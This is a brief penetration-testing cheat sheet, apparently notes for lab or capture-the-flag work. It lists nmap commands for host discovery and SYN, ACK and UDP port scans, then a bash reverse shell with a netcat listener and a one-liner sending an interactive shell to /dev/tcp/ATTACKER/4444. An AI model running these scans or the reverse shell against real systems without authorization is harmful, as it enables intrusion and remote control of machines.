TCP Pings
```
sudo nmap -vv -sn -n -PS22,80,443 -PA80,443 HOST
```

SYN Scan
```
sudo nmap -vv -Pn -n --max-retries=2 --top-ports=20 -sS HOST
```

ACK Scan
```
sudo nmap -vv -Pn -n --top-ports=20 -sA HOST
```

UDP Probe
```
sudo nmap -vv -Pn -n -sU -p PORT HOST
```

Bash Reverse Shell
```
nc -lvnp 4444
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```
